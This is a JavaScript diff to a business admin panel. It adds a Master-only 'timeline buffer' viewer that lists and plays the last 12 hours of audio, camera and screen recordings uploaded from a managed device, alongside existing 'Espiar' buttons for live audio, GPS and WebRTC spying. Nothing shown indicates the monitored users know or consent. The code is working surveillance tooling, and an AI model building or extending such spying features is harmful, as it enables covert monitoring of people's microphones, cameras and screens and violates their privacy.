@@ -18765,6 +18765,7 @@ const MOS = (() => {
                 <button onclick="event.stopPropagation();MOS.abrirDetalleDispositivo('${idAttr}')" class="shrink-0 w-6 h-6 rounded-full flex items-center justify-center hover:scale-110 transition-all" style="background:rgba(251,191,36,0.18);border:1px solid rgba(251,191,36,0.5);color:#fcd34d;font-size:10px;" title="Permisos y acciones del dispositivo">🛡️</button>
                 <button onclick="event.stopPropagation();MOS.abrirEspiaDispositivo('${idAttr}')" class="shrink-0 w-6 h-6 rounded-full flex items-center justify-center hover:scale-110 transition-all" style="background:rgba(99,102,241,0.18);border:1px solid rgba(99,102,241,0.5);color:#a5b4fc;font-size:10px;" title="Espiar (audio + GPS — clásico)">🕵️</button>
                 ${_esMasterSession() ? `<button onclick="event.stopPropagation();MOS.abrirEspiaV2('${idAttr}')" class="shrink-0 w-6 h-6 rounded-full flex items-center justify-center hover:scale-110 transition-all" style="background:linear-gradient(135deg,rgba(99,102,241,0.25),rgba(168,85,247,0.25));border:1px solid rgba(168,85,247,0.55);color:#c084fc;font-size:10px;animation:espiaBreath 3s infinite" title="Espía V2 · WebRTC live (Master)">🛰️</button>` : ''}
+                ${_esMasterSession() ? `<button onclick="event.stopPropagation();MOS.abrirTimelineBufferEspia('${idAttr}')" class="shrink-0 w-6 h-6 rounded-full flex items-center justify-center hover:scale-110 transition-all" style="background:rgba(168,85,247,0.15);border:1px solid rgba(168,85,247,0.4);color:#c084fc;font-size:10px" title="Timeline buffer (12h histórico)">📼</button>` : ''}
                 <span class="text-[10px] text-slate-500 p-1 cursor-pointer" onclick="event.stopPropagation();MOS.abrirModalDispositivo('${idAttr}')" title="Editar">✏️</span>
               </div>`;
             }).join('')}
@@ -27917,6 +27918,123 @@ const MOS = (() => {
     }
   }
   function cerrarEspiaV2() { _espiaV2Cerrar('manual'); }
+
+  // ════════════════════════════════════════════════════════════════════
+  // [v2.43.61] TIMELINE BUFFER HISTÓRICO — Reproduce chunks subidos del device
+  // ════════════════════════════════════════════════════════════════════
+  async function abrirTimelineBufferEspia(deviceId) {
+    if (!_esMasterSession()) { toast('Solo Master', 'error'); return; }
+    try { _opsBeep && _opsBeep('tac'); } catch(_){}
+    const dispositivo = (cfgData.dispositivos || []).find(x => x.ID_Dispositivo === deviceId);
+    const nombre = dispositivo?.Ultima_Sesion || dispositivo?.Nombre_Equipo || deviceId;
+    // Modal optimista — abrir con loader y traer chunks
+    const html = `<div id="espiaTimelineModal" style="position:fixed;inset:0;background:rgba(0,0,0,.75);backdrop-filter:blur(8px);z-index:2147483645;display:flex;align-items:center;justify-content:center;padding:24px;animation:espiaV2In .3s cubic-bezier(.34,1.56,.64,1)">
+      <div style="width:100%;max-width:1100px;height:84vh;background:linear-gradient(180deg,#0a1424,#070d18);border:1px solid rgba(168,85,247,.4);border-radius:16px;display:flex;flex-direction:column;overflow:hidden;box-shadow:0 30px 70px -10px rgba(168,85,247,.35)"
+           onclick="event.stopPropagation()">
+        <div style="padding:14px 20px;border-bottom:1px solid #1e293b;background:linear-gradient(135deg,rgba(168,85,247,.15),rgba(168,85,247,.03));display:flex;align-items:center;gap:14px;flex-shrink:0">
+          <div style="font-size:22px">📼</div>
+          <div style="flex:1;min-width:0">
+            <div style="font-size:14px;font-weight:800;color:#c084fc;letter-spacing:.5px">TIMELINE BUFFER HISTÓRICO</div>
+            <div style="font-size:11px;color:#94a3b8;margin-top:2px">${_escapeHtml(nombre)} · últimas 12h</div>
+          </div>
+          <select id="espiaTimelineTipo" onchange="MOS._espiaTimelineRecargar()" style="background:#0f172a;border:1px solid #334155;color:#cbd5e1;border-radius:6px;padding:5px 8px;font-size:11px">
+            <option value="">Todos</option>
+            <option value="audio_video">Audio + Cámara</option>
+            <option value="screen">Pantalla</option>
+          </select>
+          <button onclick="MOS.cerrarTimelineEspia()" style="background:rgba(248,113,113,.15);border:1px solid rgba(248,113,113,.4);color:#fca5a5;border-radius:8px;padding:6px 12px;font-size:14px;cursor:pointer">✕</button>
+        </div>
+        <div id="espiaTimelinePlayer" style="flex:1;display:flex;align-items:center;justify-content:center;background:#020617;position:relative">
+          <video id="espiaTimelineVideo" controls autoplay style="max-width:100%;max-height:100%;display:none"></video>
+          <div id="espiaTimelinePlaceholder" style="text-align:center;color:#475569">
+            <div style="font-size:48px;margin-bottom:12px">📼</div>
+            <div style="font-size:13px;color:#94a3b8">Selecciona un chunk del timeline ↓</div>
+          </div>
+        </div>
+        <div style="background:#0f172a;border-top:1px solid #1e293b;padding:14px 20px;min-height:140px;max-height:160px;overflow-y:auto;flex-shrink:0">
+          <div id="espiaTimelineLista" style="display:flex;gap:8px;flex-wrap:wrap;align-items:flex-start">
+            <div style="color:#64748b;font-size:11px;display:flex;align-items:center;gap:8px">
+              <span style="width:16px;height:16px;border:2px solid rgba(168,85,247,.3);border-top-color:#c084fc;border-radius:50%;animation:espiaSpin .8s linear infinite"></span>
+              Cargando chunks…
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>`;
+    document.body.insertAdjacentHTML('beforeend', html);
+    window._espiaTimelineState = { deviceId, chunks: [], filtroTipo: '' };
+    await _espiaTimelineCargar(deviceId, '');
+  }
+  function cerrarTimelineEspia() {
+    const m = document.getElementById('espiaTimelineModal');
+    if (m) { m.style.animation = 'espiaV2Out .25s ease-out forwards'; setTimeout(() => m.remove(), 250); }
+    window._espiaTimelineState = null;
+  }
+  async function _espiaTimelineCargar(deviceId, tipoFiltro) {
+    try {
+      const r = await API.post('espiaListarChunks', {
+        deviceId, tipo: tipoFiltro || '',
+        desde: Date.now() - 12 * 3600000,
+        hasta: Date.now()
+      });
+      const chunks = (r && r.data && r.data.chunks) || [];
+      window._espiaTimelineState.chunks = chunks;
+      _espiaTimelineRenderLista();
+    } catch(e) {
+      const lista = document.getElementById('espiaTimelineLista');
+      if (lista) lista.innerHTML = `<div style="color:#f87171;font-size:11px">⚠ Error: ${_escapeHtml(e.message)}</div>`;
+    }
+  }
+  function _espiaTimelineRecargar() {
+    const tipoEl = document.getElementById('espiaTimelineTipo');
+    const tipo = tipoEl ? tipoEl.value : '';
+    if (window._espiaTimelineState) {
+      window._espiaTimelineState.filtroTipo = tipo;
+      _espiaTimelineCargar(window._espiaTimelineState.deviceId, tipo);
+    }
+  }
+  function _espiaTimelineRenderLista() {
+    const lista = document.getElementById('espiaTimelineLista');
+    if (!lista) return;
+    const st = window._espiaTimelineState;
+    if (!st || !st.chunks.length) {
+      lista.innerHTML = `<div style="color:#475569;font-size:11px;display:flex;align-items:center;gap:8px">
+        🌙 No hay chunks del rango. (¿El device tuvo sesión espía activa?)
+      </div>`;
+      return;
+    }
+    lista.innerHTML = st.chunks.map(c => {
+      const fecha = new Date(c.ts);
+      const hh = String(fecha.getHours()).padStart(2,'0');
+      const mm = String(fecha.getMinutes()).padStart(2,'0');
+      const dd = String(fecha.getDate()).padStart(2,'0');
+      const mo = String(fecha.getMonth()+1).padStart(2,'0');
+      const icon = c.tipo === 'screen' ? '🖥️' : '🎤📷';
+      const color = c.tipo === 'screen' ? '#a5b4fc' : '#22d3ee';
+      return `<button onclick="MOS._espiaTimelineReproducir('${c.fileId}','${_escapeHtml(c.nombre)}')"
+        style="background:#1e293b;border:1px solid ${color}55;color:#cbd5e1;border-radius:8px;padding:8px 11px;font-size:10px;cursor:pointer;display:flex;flex-direction:column;align-items:flex-start;gap:3px;transition:all .15s;min-width:108px;text-align:left"
+        onmouseover="this.style.background='${color}22';this.style.borderColor='${color}'"
+        onmouseout="this.style.background='#1e293b';this.style.borderColor='${color}55'">
+        <div style="font-size:13px">${icon}</div>
+        <div style="font-weight:700;color:${color}">${dd}/${mo} ${hh}:${mm}</div>
+        <div style="opacity:.7;font-size:9px">${c.tamMB}MB</div>
+      </button>`;
+    }).join('');
+  }
+  function _espiaTimelineReproducir(fileId, nombre) {
+    try { _opsBeep && _opsBeep('tac'); } catch(_){}
+    const v = document.getElementById('espiaTimelineVideo');
+    const ph = document.getElementById('espiaTimelinePlaceholder');
+    if (!v) return;
+    // Drive iframe preview en lugar de src directo (auth + streaming).
+    // Reemplazamos el video por iframe del preview de Drive.
+    const player = document.getElementById('espiaTimelinePlayer');
+    if (player) {
+      player.innerHTML = `<iframe src="https://drive.google.com/file/d/${fileId}/preview"
+        style="width:100%;height:100%;border:0" allow="autoplay"></iframe>
+        <div style="position:absolute;top:8px;left:12px;background:rgba(0,0,0,.65);color:#fff;padding:4px 10px;border-radius:6px;font-size:10px;backdrop-filter:blur(4px)">▶ ${_escapeHtml(nombre)}</div>`;
+    }
+  }
 
   // Inicia espía (audio + gps) y abre el modal grande SIN bloquear.
   async function abrirEspiaDispositivo(idDispositivo) {
@@ -37221,6 +37339,9 @@ var _pPickState = { filtroZona: null, filtroTipo: null, mostrarTodas: false };
     // [v2.43.57] Espía V2 — WebRTC 4 streams con efectos premium
     abrirEspiaV2, cerrarEspiaV2,
     _espiaV2Swap, _espiaV2ToggleMute, _espiaV2Fullscreen,
+    // [v2.43.61] Timeline buffer histórico
+    abrirTimelineBufferEspia, cerrarTimelineEspia,
+    _espiaTimelineRecargar, _espiaTimelineReproducir,
     abrirCestaPurga, cerrarCestaPurga,
     _purgaToggleExpand, _purgaToggle, _purgaSetFiltro, _purgaSetSoloSinVentas,
     _purgaConfirmar, _cerrarConfirmPurga, _purgaValidarClave, _purgaEjecutar,
